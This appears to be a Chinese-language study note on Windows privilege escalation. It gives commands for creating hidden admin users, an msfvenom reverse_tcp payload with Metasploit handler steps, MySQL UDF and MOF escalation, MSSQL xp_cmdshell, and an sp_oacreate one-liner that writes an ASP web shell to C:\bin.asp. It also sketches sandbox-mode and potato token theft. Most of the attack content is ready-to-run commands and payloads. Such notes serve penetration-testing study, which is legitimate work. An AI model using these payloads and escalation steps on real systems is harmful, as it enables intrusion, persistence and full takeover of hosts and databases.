# Windows提权



## 提权相关的命令

**用户相关命令：**

```
net user	查看当前主机上的所有本地用户账户
net user test	查看名为 test 的用户账户的详细信息（如权限、是否启用等）
net user test passwd /add	创建一个名为 test 的本地用户，密码为 passwd
net user test /del	删除本地用户 test
net user test$passwd /add	创建名为 test$ 的本地用户，密码为 passwd（$ 可用于隐藏意图）
```

**组相关命令：**

```
net localgroup	查看本地机器上的所有用户组（local groups）
net localgroup administrators test /add	将用户 test 添加到本地的 administrators 管理员组（提升为管理员）
net localgroup administrators test /delete 将用户 test 移除到本地的 administrators 管理员组
net localgroup testgroup /add	创建一个名为 testgroup 的本地用户组
```



## 系统漏洞提权

用msf生成木马

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(本地地址) LPORT=(本地端口) -f exe >shell.exe
注:reverse_tcp为反向连接
```

1. 进入msf `msfconsole`
2. 使用监听模块 `use exploit/multi/handler`
3. 将监听模式配置为反向windows小马监听 `set payload windows/meterpreter/reverse_tcp`
4. 设置本机地址 `set lhost `
5. 设置本机端口 `lport 6666`
6. 开监听 `run`
7. 上传木马
8. msf返回监听成功视图
9. 退回到msf控制台试视图 `background`
10. 使用漏洞检测模块 `use post/multi/recon/local_exploit_suggester`
11. 运行
12. 查看参数 `option`
13. 运行
14. 查看提权成功否 `get uid`





## 数据库提权

### UDF提权

​	用户自定义函数,MySQL支持内建函数,此外还可以创建存储方法来定义函数,UDf为用户提供了一种更高效的方式来创建函数

​	Windows 的cmd链接库文件后缀为".dll",通过在udf文件中定义新函数对MySQL的功能进行扩充,可执行任意系统命令,将MySQL账号root转化为system权限

#### 提权过程

1. 上传UDF.dll文件到服务器指定目录

​		MySQL < 5.0 **任意路径**

​		5.0 <= MySQL <5.1 必须放在目标**服务器的系统目录**

​		<5.1 必须放在MySQL目录下的**lib/plugin**文件夹下

2. 使用SQL语句创建功能函数

   `CREATE FUNCTION shell RETURNS STRINGS SONAME 'udf.dll'`

   把名为shell的函数和udf.dll存入一个特殊的表中(把函数和文件绑定).`,当我们用shell这个函数的时候,会调用udf.dll里面的内容

3. 执行mysql语句调用新创建的函数

   `select shell ('C:/windows/system32/cmd.exe','whoami')`

MSF也可以实现

msf6 > use exploit/multi/mysql/mysql_udf_payload 模块



### MOF提权

MOF文件,托管对象格式文件,.是创建和注册提供程序,事件类别和事件的简便方法,文件路径为,c:/windows/system32/wbme/mof,其作用为**每隔五秒就监控进程创建和死亡**

#### 提权要求:

1. windows 03以下版本
2. mysql启动身份具有权限去读写C:/windows/system32/wbem/mof目录
3. 设置my.ini的 secure_file_priv 为空



#### 提权原理

 MOF文件每隔五秒就会执行一次.**而且是系统权限**,通过mysql的 load_file 和 into_dumpfile将文件写入/wbme/mof.然后系统每隔五秒会执行一次我们上传的MOF.其中有一小段是vbs脚本,我们可以控制这段内容让系统执行命令





### Mssql

### (SQLserver)提权



#### XP_cmdshell

XP_cmdshell是sqlserver一种**扩展存储过程**,利用这个我们可以在sql脚本中运行cmd命令,并返回相应的输出结果

- **功能**：在 SQL 语句中直接嵌入并执行任何 Windows 可执行命令。例如，执行 `xp_cmdshell 'dir C:\\'` 可以列出 C 盘目录。
- **权限**：由 `xp_cmdshell` 生成的进程，默认拥有 **与 SQL Server 服务帐户相同的安全权限**。如果 SQL Server 以高权限（如 `SYSTEM` 或管理员）运行，这将是巨大的安全隐患。
- **执行方式**：该命令是**同步**执行的，即只有等操作系统命令运行完毕，控制权才会返回给 SQL Server。
- **输出**：命令执行的结果会以文本行的形式返回。
- **代理账户**：出于安全考虑，可以为非管理员用户设置一个权限更低的**代理账户**来执行 `xp_cmdshell`，避免直接使用高权限的服务帐户。



#### sp_oacreate提权

mssql的sp_oacreate提权 

sp_oacreate创建OLE对象示例,可以实现调用系统权限的cmd.exe执行命令

1. sp_oacreate 创建OLE实例,此功能默认是关闭的,需要开启:
   exec sp_configure 'show advanced options',1;

   RECONFIGURE;

   exec sp_configure 'Ole Automation Procedures',1;

   RECONFIGURE;

2. 使用此功能创建一个木马文件 bin.asp到C盘下

```mssql
Declare @s int;exec sp oacreate 'wscript.shell',@s out;Exec SP OAMethod @s,'run',NULL,cmd.exe /c echo ^<%execute(request(char(35)))%^>>c:\bin.asp';
```

这段SQL代码通过SQL Server的**OLE自动化**功能（`sp_oacreate` 和 `sp_oamethod`），调用系统组件 `wscript.shell` 执行了一条操作系统命令。这条系统命令的作用是：**在C盘根目录下创建一个名为 `bin.asp` 的恶意网页文件**。

#### 沙盒模式提权

SQL Server的“沙盒模式”本意是限制Jet引擎，防止其执行不安全的函数或命令。而这个提权手法的关键在于将沙盒模式设置为一个不安全的级别，使得Jet引擎可以执行 `shell()` 函数。

**利用条件**

- **拥有`sa`权限**：攻击者需要获取到MSSQL数据库的`sa`（系统管理员）账户密码。这是几乎所有MSSQL提权方式的基础。
- **操作系统为Windows**：此方法依赖于Windows的组件和注册表

**提权步骤**

1.  **开启`Ad Hoc Distributed Queries`组件**
2. **修改注册表，开启不安全的沙盒模式**
   - **沙盒模式 (`SandBoxMode`) 参数含义**:
     - `0`：在任何所有者中**禁止**启用安全模式（**最不安全，允许执行任意命令**）
     - `2`：必须在access模式下（默认值）
     - `3`：完全开启（最安全）
3. **执行系统命令**添加用户加入管理员组



## 土豆提权

其核心原理，简单来说，就是**利用Windows服务账户（如IIS、MSSQL等）已有的“模拟令牌”特权，通过一系列操作“窃取”到SYSTEM权限的令牌，从而创建一个高权限的进程**。